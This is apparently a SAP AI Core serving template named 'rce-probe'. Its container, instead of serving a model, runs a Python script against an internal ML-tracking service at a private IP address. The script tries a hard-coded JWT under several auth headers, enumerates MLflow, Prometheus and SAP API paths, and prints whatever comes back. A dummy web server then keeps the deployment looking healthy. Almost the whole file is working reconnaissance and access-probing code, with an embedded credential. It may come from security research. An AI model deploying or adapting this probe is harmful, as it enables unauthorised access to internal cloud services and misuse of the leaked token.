apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "61.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "ml-tracking-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 << 'PYCODE'
            import urllib.request, urllib.error, json, ssl

            ML_TRACKING_IP = "100.111.137.177"
            ML_TRACKING_PORT = 80
            BASE_URL = f"http://{ML_TRACKING_IP}:{ML_TRACKING_PORT}"

            JWT = "eyJ0eXAiOiJKV1QiLCJqaWQiOiJQUittUkcwaEtTQ29DWWNhbStaNzNzZU42WGR1UmtFNkh4QzdxcCtNckVrPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTIuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTE1YWFlMTgxYjYifQ..FX6LHQ907e6eAar6Tpdo0x39_WxxQphlzYBflOWjoAZ126aJMaWfZ28VVZ4vstidYa1pV30MBOQnQvEzE5Q8SkooIz8L-txskdBFFd-X41kXZWcvrh2zWWRtZ8F4BYkp7zVWqatB-PTtM_hwkEXxnWHbP5qxs22puvqxLTxLkcRvOkVJZD_WpSWzVnPn9JQPhmM-PDsjuIyEHMJO5FWzW5dX7B_MclyCbR-OEvo0zr5EkOkD0Eda2AqTzVc8BFY5p4DuoWyAHi1woDwBps4cXdb_8EkubhxGrIejH-jEQVIxasODgUKQT6G34knkA6y_--w2JnaGAbKn6blmkEet2A"

            print("[ML_TRACKING_PROBE_START]")

            def probe(path, headers=None):
                if headers is None:
                    headers = {}
                url = f"{BASE_URL}{path}"
                req = urllib.request.Request(url, headers=headers)
                try:
                    with urllib.request.urlopen(req, timeout=5) as r:
                        body = r.read(3000).decode(errors='replace')
                        print(f"  {path} [headers={list(headers.keys())}] -> 200: {body[:500]}")
                        return 200, body
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read(500).decode(errors='replace')
                    except: pass
                    print(f"  {path} [headers={list(headers.keys())}] -> {e.code}: {body[:200]}")
                    return e.code, body
                except Exception as ex:
                    print(f"  {path} -> ERR: {str(ex)[:80]}")
                    return 0, ""

            # Phase 1: Probe with different auth headers
            print("\n=== Auth header variants ===")
            for path in ["/", "/healthz", "/metrics", "/api/v1", "/api/v1/metrics", "/api/v1/runs", "/api/v1/experiments"]:
                # No auth
                code, body = probe(path, {})
                
                # With Bearer JWT
                probe(path, {"Authorization": f"Bearer {JWT}"})
                
                # With X-Auth-Token
                probe(path, {"X-Auth-Token": JWT})
                
                # With X-Token
                probe(path, {"X-Token": JWT})

            # Phase 2: MLflow-specific paths (common ML tracking framework)
            print("\n=== MLflow API paths ===")
            mlflow_paths = [
                "/ajax-api/2.0/mlflow/experiments/list",
                "/ajax-api/2.0/mlflow/experiments/get",
                "/ajax-api/2.0/mlflow/runs/search",
                "/ajax-api/2.0/mlflow/runs/get",
                "/ajax-api/2.0/mlflow/artifacts/list",
                "/ajax-api/2.0/preview/mlflow/experiments/list",
                "/api/2.0/mlflow/experiments/list",
                "/api/2.0/mlflow/runs/search",
                "/api/2.0/preview/mlflow/experiments/list",
                "/api/v1/metrics",
                "/api/v1/runs",
                "/api/v1/experiments",
            ]
            for path in mlflow_paths:
                code, body = probe(path, {})
                if code == 200:
                    print(f"  >> 200 HIT: {path} -> {body[:300]}")

            # Phase 3: With valid JWT
            print("\n=== With valid JWT bearer ===")
            for path in mlflow_paths[:6]:
                probe(path, {"Authorization": f"Bearer {JWT}"})

            # Phase 4: Check if there's a /metrics endpoint (Prometheus)
            print("\n=== Prometheus metrics endpoint ===")
            probe("/metrics", {})
            probe("/metrics", {"Authorization": f"Bearer {JWT}"})

            # Phase 5: Experiment with different paths (SAP-specific)
            print("\n=== SAP ML Tracking API ===")
            for path in [
                "/v2/lm/metrics",
                "/v2/lm/runs",
                "/v2/lm/experiments",
                "/api/v1/aicore/metrics",
                "/api/v1/training/metrics",
            ]:
                probe(path, {})
                probe(path, {"Authorization": f"Bearer {JWT}"})
                probe(path, {"Authorization": f"Bearer {JWT}", "AI-Resource-Group": "default"})

            print("\n[ML_TRACKING_PROBE_END]")
            PYCODE
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
